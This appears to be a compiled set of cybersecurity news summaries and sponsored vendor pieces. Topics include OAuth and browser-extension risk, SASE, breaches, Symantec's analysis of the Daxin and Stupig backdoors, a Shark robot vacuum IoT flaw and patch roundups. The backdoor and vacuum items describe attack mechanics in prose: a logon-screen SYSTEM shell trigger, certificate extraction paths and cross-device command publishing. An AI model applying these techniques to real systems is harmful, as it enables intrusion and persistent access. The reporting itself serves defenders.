Modern enterprises have more apps, more extensions, and more third-party connections than traditional security programs can manually assess. As the breaches of Klue and Salesloft Drift illustrated, OAuth grants can provide broad, persistent access to sensitive data, which attackers are increasingly exploiting. Browser extensions can introduce supply chain risk directly into employees' daily workflows. Shadow AI and SaaS sprawl mean new vendors and new exposures can appear faster than any ticket queue can keep up with.

Nudge Security's agentic capabilities address sources of risk that have long outpaced manual human review:

- OAuth Grant Risk Analyst analyzes OAuth grants, flags anomalies, and recommends specific revocations based on the organization's security policies.
- Browser Extension Risk Analyst surfaces risky and malicious third-party browser extensions installed on employee devices and helps prioritize remediation.
- Vendor Risk Analyst (existing) automatically generates and maintains SaaS and AI vendor security profiles for every AI and SaaS app, including compliance attestations, security posture indicators and AI data privacy policy insights.

"Security teams are buried under manual reviews while the business keeps moving. AI is accelerating adoption and expanding the attack surface at the same time," said Jaime Blasco, CTO at Nudge Security. "Unvetted OAuth grants, risky browser extensions, and unknown AI and SaaS apps can operate in the shadows for months or even years, creating thousands of access paths into corporate data."

Built for defenders across the surfaces others still miss

Nudge Security uniquely combines multiple discovery signals across the browser, inbox, identity provider, and connected apps to provide the most complete and timely view of AI, SaaS, OAuth, and browser extension risk. This broader context helps the agents make higher-confidence recommendations and deliver targeted, policy-driven remediation guidance that reduces noise and increases throughput for overburdened IT and security teams.

7dbb7d870a7c.text:
For years, routing traffic through cloud proxies was good enough. Then work moved to the browser, AI entered the workflow, and the inspection model stopped keeping up.

Enterprise workflows now live across SaaS applications, browsers, and an expanding ecosystem of generative AI tools, unsanctioned browser extensions, and autonomous agents. Employees routinely paste intellectual property into public LLMs for code optimization, while automated agents query internal documentation and move data across systems at machine speed. The challenge is not that SASE failed, but that data interactions have shifted to the presentation layer, an area network-centric architectures were never designed to see.

Why Traditional Enforcement Struggles

Traditional SASE relies on backhauling traffic to cloud proxies for decryption, inspection, and policy enforcement. However, modern internet protocols, specifically TLS 1.3, HTTP/3, and certificate pinning, were engineered explicitly to block this type of man-in-the-middle interception.

When a cloud proxy attempts to force decryption on a TLS 1.3 session with certificate pinning, the client application routinely drops the connection. To prevent business-critical service downtime, network teams are forced to write bypass exceptions. This creates a structural problem: organizations maintain massive exemption lists, quietly shrinking their security perimeter one application at a time just to keep tools functioning.

Beyond the security gap, this model introduces heavy performance penalties for the workforce. Forcing sessions through distant cloud inspection paths creates latency and unstable video calls. When security infrastructure slows critical tools, users actively seek shadow workarounds to stay productive, expanding the attack surface IT seeks to protect.

AI and the "Moment of Intent"

AI and agentic workflows have made this architectural gap impossible to ignore. A traditional network proxy sees a valid, encrypted HTTPS connection to an LLM provider. It cannot see payload intent, such as an autonomous AI agent using model context protocol (MCP) tool calls to pull proprietary code or internal documentation.

By the time data reaches a network inspection point, the interaction has already occurred. The moment of intent has passed. This leaves security teams trapped in a binary dilemma: block AI entirely and drive users toward shadow IT, or allow it unrestricted and accept total data opacity.

The Architecture Shift

To govern AI and modern SaaS, enforcement must happen at the point of interaction, on the device: the browser and the endpoint. When network-level security or routing is required, traffic must be steered dynamically to the closest available edge infrastructure, eliminating redundant hops and performance-killing detours.

Evaluating policy at the last mile changes the enforcement model entirely:

- Contextual data protection: Copy, paste, and prompt content are inspected locally before data ever leaves the device.
- Protocol native alignment: Modern encryption protocols function natively without invasive decryption workflows.
- Direct-path performance: Up to 90% of trusted traffic takes the direct path to its destination, eliminating the proxy "detour tax" and restoring native application speed for the end user.

This shift is driving adoption of the "Perfect Packet" architecture, a model that evaluates context at the endpoint before routing, invoking cloud inspection only when a session requires additional verification.

[Contributed/sponsored piece; article links to Island's "The Perfect Packet: A Guide to Modern SASE Architecture" and other Island resources. Disclosure: "This article is a contributed piece from one of our valued partners."]

7bb4c2267f42.text:
Trevor Long reports:
A large health care chain that owns family medical clinics across Australia has been the victim of a cyber breach which has exposed the data of their patients, including potentially treatment information.
Partnered Health runs a large number of clinics across Australia, with sixteen of them listed as directly affected, and a further group yet to confirm the status of their networks and systems.
The company says: “On 23 June 2026, Partnered Health became aware that a malicious actor accessed some of our data. In response, Partnered Health engaged specialist cyber experts to provide advice. We took immediate steps to contain the incident and assess whether personal information was accessed. This investigation remains ongoing.”
It’s taken 22 days for the company to report the breach to customers and authorities, with patients today receiving SMS notifications of the breach.
Read more at EFTM.

Binary Defense has announced NightBeacon CMD, a standalone AI-driven SOC workbench that enterprise security teams can deploy in their own environments. Built and hardened inside Binary Defense's live 24/7 Security Operations Center (SOC), NightBeacon CMD gives customers the same operating platform Binary Defense's own analysts use every day, without requiring a managed service.

Rather than simply adding another AI layer to existing security tools, NightBeacon CMD fundamentally changes how a SOC operates. The platform delivers roughly 80% of the investigation work pre-built, automatically correlating threat activity across endpoint, identity, network, and cloud into decision-ready situations before an analyst ever opens a ticket.

With support for 116+ connectors across nine categories, enrichment from 80+ threat intelligence sources, and a detection pipeline backed by 8,700+ malware rules, analysts spend less time assembling evidence and more time making decisions. Designed for rapid implementation, NightBeacon CMD can be deployed into complex environments within minutes, with organizations seeing value almost immediately.

CEO David Kennedy stated: "For years this industry has thrown more alerts, more dashboards, and more tools at analysts and called it progress."

Zero-Queue Model

The platform automatically correlates related alerts across endpoint, identity, network, and cloud into single narrated situations. Enterprises facing 3,000-5,000+ daily alerts with approaching 99% false-positive rates can benefit from this approach, particularly given that attackers can move laterally in less than 29 minutes.

Operations Room and Transparency

Every AI-generated recommendation includes confidence scores, attack timelines, evidence, suggested actions, and transparent reasoning, with analysts maintaining override capability. Dr. Aaron Estes noted that the design enables analysts to focus on threat hunting rather than alert stitching.

Proactive Hunting Capabilities

The platform never trains on customer data, instead learning from privacy-preserving analyst feedback with no customer logs retained or shared across tenants. Additional capabilities include Deep Scan malware analysis, Entity Risk Radar behavioral scoring, aggregated threat intelligence, cross-organization campaign detection, and automated reporting.

bf3557a0095d.text:
A single approved marketing tag can quietly load fourth-party code your security team has never seen, granting full access to your forms, customer data, and checkout pages.

This on-demand webinar reveals how this Approval Gap forms, and gives your team the blueprint to close it before an auditor, regulator, or attacker finds it first.

The Reality of the Approval Gap

It's a pattern every security and IT team recognizes: You ran the security review. You approved the vendor. You moved on. But the marketing tag you signed off on rarely stays the same as the tag executing in your users' browsers. One approved vendor loads another. That one loads more, and within a few hops, your site is executing fourth-party scripts no one on your team has ever vetted. Because they run client-side, they have the same access to your forms, checkout fields, and customer data as the code your own engineers wrote.

This is the Approval Gap: "the distance between what security signed off on and what is actually running on your site right now."

Two Sides of the Same Table: Reflectiz & Taboola

This isn't just an advertiser problem; it's a challenge that responsible ad tech platforms actively work to solve. Taboola's content discovery platform reaches 600 million daily active users across 9,000 publisher partners, which means its own code is precisely the kind of third-party script a security team needs to vet before letting it near a checkout page.

In this webinar, Reflectiz co-founder and CEO Idan Cohen and Taboola's Director of Product Omri Ariav break down the problem from both sides of the table.

Ariav compares Taboola's code to a houseguest: "We believe that we are guests on the publisher's or advertiser's landing page. And we need to behave." However, he emphasizes continuous monitoring matters: "The initial approval is not the finish line. You need a continuous way of monitoring, sandboxing, and ensuring they're meeting a good security standard."

The Five Indispensable Questions

The webinar outlines five critical questions to ask every marketing vendor before approving their code. Cohen notes that "A vendor that can't answer the questions isn't malicious, but it's unmonitored, and unmonitored means risk." The first question addresses what other code the tag loads and who vetted it.

Why AI Is Accelerating the Threat

This visibility matters more than ever. AI-driven ad tech spins up new integrations, endpoints, and data flows at machine speed, so the approval you granted last quarter describes a stack that no longer exists. At the same time, AI is making browser abuse cheaper, faster, and accessible to non-technical attackers. According to Reflectiz's State of Web Exposure Report 2026, "53% of retail risk exposures stem from the excessive use of tracking tools." This points to a structural problem: when different departments have different priorities, who actually owns the responsibility?

What You Will Walk Away With

- The Fourth-Party Chain: How a single approved marketing tag spawns a cascade of third- and fourth-party scripts your security team never reviewed
- The AI Acceleration: Why AI-driven ad tech is expanding your client-side attack surface faster than point-in-time audits can catch
- The Compliance Reality: Where regulators now look first, and how GDPR, CCPA, and PCI DSS apply to vendor scripts already running on your site
- The Benchmark for Trust: What transparent, security-forward ad tech looks like in 2026
- Your 3-Step Playbook: A practical framework to inventory, monitor, and govern your web supply chain

Who Is This For?

- CISOs and application security leaders
- Privacy and compliance teams
- Digital and marketing technology leaders
- Anyone responsible for what runs on their organization's websites

The article concludes: "Your marketing tags are already live on your pages. Do you know what they are really doing right now?"

e481da007d08.text:
More than four years after Symantec first uncovered Backdoor.Daxin, the malware has resurfaced. Symantec's Threat Hunter Team discovered Daxin actively deployed on a compromised host in Taiwan during May 2026, extending far beyond previous detections.

Researchers also identified a previously undocumented backdoor called Backdoor.Stupig using a technically distinctive persistence approach and pre-authentication code execution. While no direct code connection has been established between the two tools, their co-deployment, complementary functions, and shared development practices suggest they originated from the same group. Both samples carry compilation timestamps from early 2013, separated by only a few weeks.

Daxin operates as a Windows kernel-mode driver backdoor that Symantec initially documented in early 2022, though samples trace back to 2013. Rather than establishing outbound command-and-control connections, it monitors incoming TCP traffic for specific patterns and hijacks legitimate connections for encrypted communications. This approach made detection exceptionally difficult using conventional network monitoring. The malware also supported multi-hop communications through infected machine chains to reach isolated network segments.

Symantec attributed Daxin to "a China-linked espionage group that conducted long-running espionage campaigns against select governments and other targets of strategic interest to China."

The recent malicious activity emerged in May 2026 on a host with no prior telemetry records. Two tools were identified:

Backdoor.Daxin (srt64.sys): A kernel-mode driver installed in %SystemRoot%\System32\drivers, digitally signed to pass Windows driver-signature checks. Compilation and signing timestamps date to January 2013.

Backdoor.Stupig (a.dll / kbdus1.dll): A previously unknown backdoor deployed initially as a.dll in the Windows directory, later detected as kbdus1.dll in System32. Its compilation timestamp dates to February 2013.

Stupig achieves persistence by registering as a keyboard-layout provider, causing win32k.sys to load it into winlogon.exe at startup. The DLL returns a valid KBDTABLES pointer, allowing normal keyboard layout functionality while concealing its presence from processes and administrators inspecting loaded modules. This persistence mechanism relates to the Winlogon Helper DLL technique described in MITRE ATT&CK T1547.004 but uses "a different registry loading path, one not previously documented in known malware families."

Once running inside winlogon.exe, Stupig monitors the Windows logon screen for usernames beginning with "stupig". When such a username appears, any following string executes as SYSTEM on the secure desktop (Winsta0\Winlogon). If nothing follows the prefix, a command prompt running as SYSTEM spawns directly on the logon screen. The actual LsaLogonUser function then processes normally, causing a standard failed-logon response without generating audit event anomalies beyond an unusual username failure entry.

The malware also installed inline hooks on SspiCli!LsaLogonUser and Advapi32!CredUnprotectA, enabling credential interception within the winlogon.exe process. A LoadLibraryA("msyun.dll") call referenced a companion payload not recovered during investigation.

The compromised host showed no telemetry before May 12, 2026, suggesting both samples could have resided on the host or network for considerable periods. Given the tools' 2013 timestamps and the actor's known pattern of maintaining "long-term, stealthy persistence in targeted networks," the intrusion may have remained undetected for approximately 13 years.

The most likely initial access vector involved an outdated Digiwin single sign-on portal still running Java Development Kit versions 1.5 and 1.6 from 2009-2011, both long past end-of-life status.

The victim was a Taiwan-based subsidiary of a multinational high-tech manufacturer. While earlier Daxin victims were governments, all targets appeared strategically significant to China. Previous investigations documented use against government, telecommunications, transportation, and manufacturing targets.

Stupig's reappearance, renamed from a.dll to kbdus1.dll, occurred after initial detection on May 28, 2026. The renamed version appeared in System32 on June 1, constructed to resemble legitimate Windows keyboard-layout library kbdus.dll, differing by a single appended character to evade filename-based detection controls.

Symantec products detect this activity using definitions for Backdoor.Daxin and Backdoor.Stupig. File indicators provided include:
- 49c827cf48efb122a9d6fd87b426482b7496ccd4a2dbca31ebbf6b2b80c98530 (srt64.sys)
- 5bb5cffda4647940919a185df37aab2aef71ca3010a6c1d05bdcc8bc8fb3af3f (a.dll/kbdus1.dll)

dbea02982159.text:
The export controls imposed on Anthropic's Fable model mark a significant shift in United States (US) artificial intelligence (AI) policy. The controls set a precedent for treating frontier AI models as strategic assets rather than ordinary software products, creating uncertainty for enterprises adopting advanced AI. Security leaders should respond by investing in resilient, interoperable AI strategies rather than simply chasing the most powerful model available.

[Full article covers: The Saga of the Fable Export Controls, Possible Motives Behind US Policy, The Definition of "Dangerous AI" Is Still Unclear, Ad Hoc Regulation May Become the Norm, How Security Leaders Should Respond, and Final Thoughts.]

Key quote: "The export controls on Fable may prove to be an isolated case. They may also be the first visible sign of a more restrictive AI era."

(Source identified as Recorded Future's Insikt Group; explicit author byline and full publish timestamp were not shown on the fetched page.)

54205abd6fb2.text:
A Welsh man was sentenced to prison Tuesday for his role in numerous swatting incidents across the UK, US, and Canada.

Callum Dare, 26, from Talbot Green, served as an administrator of Doxbin, a dark web platform where users expose personally identifiable information to encourage harassment or facilitate swatting attacks.

While Dare never personally made swatting calls, investigators confirmed he "was an active participant" in Doxbin's "#deadnet" channel, where he actively encouraged others to target individuals and organizations through swatting.

The investigation began in May 2019 when Dare was 19, after the FBI engaged South Wales Police and Tarian Regional Organised Crime Unit. Officers discovered messages linking him to multiple swatting attacks across North America.

Dare created video compilations from internet livestreams and other footage showcasing emergency services responding to swatting calls. He shared these videos in the #deadnet channel "in an attempt to encourage others to carry out similar offences."

Notable incidents included a UCLA bomb threat that prompted evacuations and a December 2018 attack on a Cardiff hotel that forced police to evacuate St. Mary Street during the busy holiday season.

A Canadian swatting victim—a programmer subjected to a false hostage-and-explosives call—ultimately triggered the investigation's breakthrough. Canadian authorities and the FBI seized Doxbin records, identifying usernames "Chans" and "KT" as a Welsh-based admin.

Investigators traced a PayPal account and email address to Dare's identity. When arrested, police found digital evidence supporting his involvement and a phishing kit called "The Man in the Onion" designed to harvest credentials from dark web marketplace imitations.

Dare pleaded guilty June 15 to encouraging malicious communications and possession of fraud-related articles. According to his defense, he suffered from ADHD, autism, low borderline IQ, and a troubled upbringing.

Sentence: Two years and three months in prison.

FBI Special Agent Terence G. Reilly stated: "Swatting is not a victimless prank – it is a reckless and dangerous crime that can have deadly consequences."

Crown Prosecution Service prosecutor Louisa Robertson emphasized that false emergency calls divert resources from genuine emergencies, noting international cooperation enabled building a strong case against Dare.

02afd7b22682.text:
The U.S. Cybersecurity and Infrastructure Security Agency has mandated that federal agencies patch a critical Oracle E-Business Suite flaw by July 18. The vulnerability, tracked as CVE-2026-46817, exists in the File Transmission component of Oracle Payments and has a CVSS severity rating of 9.8.

The flaw allows "unauthenticated threat actors with HTTP network access to take over vulnerable systems in low-complexity attacks." Oracle released patches in May 2026, warning customers that some breaches occurred because organizations "failed to apply available Oracle patches."

Threat intelligence firm Defused confirmed active exploitation beginning June 29, stating that "over the weekend, we observed an actor exploiting the vulnerability on our Oracle E-Business honeypots." Shadowserver tracks over 1,000 exposed Oracle EBS instances globally, with more than half located in the United States.

CISA added the vulnerability to its known exploited vulnerabilities catalog on Wednesday, citing it as representing "frequent attack vectors for malicious cyber actors" that "pose significant risks to the federal enterprise." The patching mandate falls under Binding Operational Directive 26-04.

This marks the latest in a series of Oracle product vulnerabilities CISA has flagged as actively exploited, with 43 total security issues identified across various Oracle products in recent years.

524ed748305c.text:
A researcher identified a critical flaw in Shark robot vacuums that allows remote code execution across AWS regions. By extracting a certificate from a Shark RV2320EDUS vacuum, attackers can control other Shark vacuums in the same region.

Key Technical Details:

The vulnerability stems from improperly scoped AWS IoT device policies. The certificate policy never restricted devices to their own topics, allowing an attacker to "read or modify shadows, jobs, or job executions for all your devices," as AWS documentation warns.

An attacker can:
- Subscribe to device topics using a stolen certificate
- Publish commands to any vacuum's shadow document
- Execute commands under 1,000 bytes via the Exec_Command field
- Access camera feeds and Wi-Fi passwords

Hardware Access Required:

The exploit requires physical access to remove the mainboard and extract /mnt/res/vapp/certs/ files. The U-Boot bootloader provides unauthenticated root access.

Scope and Timeline:

The researcher observed 1.5 million unique Shark serials in one AWS region over 24 hours, with 673,816 devices (44%) responding to command requests.

SharkNinja received the report March 1 but had not patched as of publication July 13—four months later. AWS's server-side fix requires policy rescoping without firmware updates.

4308bd8908aa.text:
Nightmare Eclipse, also known as Chaotic Eclipse, has released another unpatched Windows vulnerability coinciding with Microsoft's July 2026 Patch Tuesday. The exploit, named LegacyHive, targets a local privilege escalation bug in the Windows User Profile Service that permits attackers to load other users' registry hives, including those belonging to administrators.

The proof-of-concept code functions on systems running Microsoft's July 2026 patches. According to the researcher, the vulnerability "will end up mounting the target user hive in current user classes root" when successful, requiring credentials for another standard user and a third username, which could be an administrator account.

Unlike previous zero-day releases from this researcher, LegacyHive was published with a stripped PoC to prevent widespread exploitation. The researcher notes the original exploit didn't require user credentials and allowed loading any hive, though this capability remains possible with additional work.

Nightmare Eclipse has previously released over six zero-days targeting Microsoft products, including BlueHammer, RedSun, UnDefend, GreenPlasma, RoguePlanet, YellowKey, and GreatXML—several of which have been exploited in active attacks.

Microsoft stated it is "actively investigating the validity and potential applicability of these claims" and remains "committed to investigating security issues and updating impacted products to protect customers as soon as possible."

fa6bcbecb3b3.text:
Most of the software running inside a typical company was written by volunteers the company never paid. Open-source code sits under web apps, build pipelines, and the machine learning stacks getting so much attention right now. Roughly 96 percent of codebases carry some of it.

That dependence turned visible in December 2021, when the log4j flaw exposed applications from Twitter to Minecraft. The xz utils backdoor of 2024 drove the point home again. Both traced back to tiny volunteer teams looking after code that billions of systems lean on, often in their spare time around day jobs.

Everyone uses the code for free, from solo developers to the largest tech firms, and almost no one is on the hook to give anything back. Maintainers burn out. Projects holding up huge chunks of the internet run on a handful of people and a lot of goodwill.

Governments started treating this as their problem too. Germany's Sovereign Tech Fund began in 2022 under the Federal Ministry for Economic Affairs and Climate Action, hosted by SPRIND. It signs maintenance contracts with open-source projects, starting at 50,000 euros and running anywhere from several months to a couple of years.

In November 2024 the fund grew into the Sovereign Tech Agency. Its lineup now covers well over a hundred projects, with sister programs pointed at developers and at security work.

So what does the money buy? A new study takes a run at exactly that. Laia Domenech Burin, a data scientist at the agency, crunched the numbers on whether paying for maintenance changes what a project puts out. Her approach was to build a stand-in for each funded project out of similar projects that got nothing, then check whether the funded ones pulled ahead.

Getting a fair comparison was the hard part. She started with a long list of open source projects that plenty of other software leans on, picked the ones that resembled the funded projects on things like dependent repositories, stars, and forks, and landed on 62 unfunded projects to measure twelve funded ones against. The activity data ran back to 2015.

Four funded projects sit at the center: the Python Package Index, curl, Fortran tooling, and RubyGems. These are load-bearing pieces of everyday development. Curl alone reports more than twenty billion installations across phones, cars, televisions, and medical devices. Its funded stretch worked through more than a hundred known bugs and added support for newer versions of the HTTP protocol.

The short version of the result is that the money moves the code. Funded projects logged a real rise in commits, in new change requests, and in merged ones. New issues went up too. The picture is a burst of development in the quarters right after a contract gets signed.

And the burst is big. "Commits roughly doubled and then some, up about 144 percent over where they would have landed with no funding." New issues climbed significantly. Change requests moved by amounts in the same range. The margins around these figures are wide, so they point to a direction more than a hard number.

Three things stayed flat. The number of contributors barely budged. Release frequency held steady, and so did the count of closed issues. The money got more out of the people already on hand. It pulled in few new ones, and it left the backlog about where it was.

That mix is the part worth chewing on. Paying a project speeds up what its current maintainers do. The shortage of hands stays a shortage. Domenech Burin describes the metrics as indicating direction rather than destination.

The study covers four projects and twelve repositories, a thin base for sweeping claims. The jump in new issues cuts two ways: an engaged crowd filing bug reports, or a growing pile of work no one has time to touch.

There is a lesson in here for anyone writing checks for open source, in a company or a government. Growing the contributor base and clearing the backlog sit with the agency's other efforts, a fellowship for developers and a resilience program aimed at vulnerabilities. Grading a maintenance contract on contributor counts would measure the wrong thing.

Match the yardstick to the goal. A fund that pays for maintenance buys speed from current maintainers. Growing the community and working through old items are separate jobs, with their own budgets and their own scorecards. The money keeps critical infrastructure moving. Keeping the people behind it going is a different line in the ledger.

0f1e4214ceb3.text:
Microsoft addressed approximately 600 vulnerabilities in its July 2026 Patch Tuesday, marking a dramatic shift in update volume. The release included 570 CVEs in Microsoft products, reaching 620 when platform-level server patches are included—not counting 470 additional vulnerabilities in Chromium.

The vulnerability breakdown showed: 254 elevation of privilege issues, 145 remote code execution (RCE) flaws, 102 information disclosures, 35 denial of service bugs, 17 security feature bypasses, and 16 spoofing vulnerabilities. Notably, 416 bugs were found in Windows itself alone.

Key Zero-Day and Critical Vulnerabilities:

Three zero-days were identified. CVE-2026-56155 (CVSS 7.8) enabled privilege escalation in Active Directory Federation Services. CVE-2026-56164 (CVSS 5.3) involved SharePoint authentication flaws. CVE-2026-50661 (CVSS 6.1) represented "yet another BitLocker bypass" requiring physical access.

Among critical vulnerabilities, CVE-2026-57092 (CVSS 9.9) allowed virtual machine escape via VMSwitch. CVE-2026-56190 (CVSS 9.8) enabled unauthenticated RDP remote code execution. CVE-2026-50518 (CVSS 9.8) involved DHCP server heap overflow exploits.

Root Cause:

Microsoft attributed the surge to MDASH—its AI-powered vulnerability scanning system actively analyzing critical Windows components. The company warned customers that update volumes would continue increasing.

Recommendations for Organizations:

Organizations should automate host scanning and update deployment, prioritize patches based on severity and business impact, and establish streamlined approval processes to manage the unprecedented volume of security updates.

d07eabb941de.text:
Four major cybersecurity vendors released patches this month addressing critical and high-severity vulnerabilities in their products.

Tenable fixed a critical path traversal flaw (CVE-2026-15265) in Tenable Agent that "may allow an attacker to achieve remote code execution." The vulnerability was disclosed this week to customers.

ESET patched a high-severity local privilege escalation in Inspect Connector for Windows. The company explained that attackers could "send self-crafted Advanced Local Procedure Call (ALPC) requests" to vulnerable processes without proper authentication, potentially accessing restricted functions. ESET also released a separate advisory addressing a medium-severity denial-of-service vulnerability in its Linux security products.

Tanium informed customers of a high-severity denial-of-service flaw in Tanium Server, noting the vulnerability "could allow an unauthenticated, network-based attacker to perform a denial of service attack."

Trend Micro disclosed a medium-severity arbitrary file deletion vulnerability in Cleaner One Pro that could permit "a malicious app already running on your device to trick the cleanup process into deleting a file it shouldn't have access to." Local access is required for exploitation.

The article notes that while no active exploitation has been confirmed for these latest vulnerabilities, security products themselves have historically been targeted by threat actors, citing recent in-the-wild exploitation of Palo Alto Networks and Trend Micro products as examples.

(Author: Eduard Kovacs; Published: July 16, 2026, updated July 18, 2026)

cf413359983e.text:
Tenable has announced an expansion of the Tenable One Exposure Management Platform that combines application security risks with comprehensive exposure data. The update integrates static code vulnerability data to provide complete visibility from code development through runtime across the entire attack surface.

Security teams face a persistent challenge where vulnerable code reaches production environments faster than it can be adequately reviewed. Generative AI accelerates this problem by enabling developers to deploy code three to four times more rapidly while potentially introducing flaws at significantly higher rates.

Currently, application security teams and developers depend on disconnected solutions lacking the contextual infrastructure intelligence needed to assess whether code vulnerabilities represent genuine business threats. This fragmented approach creates critical blind spots in security coverage.
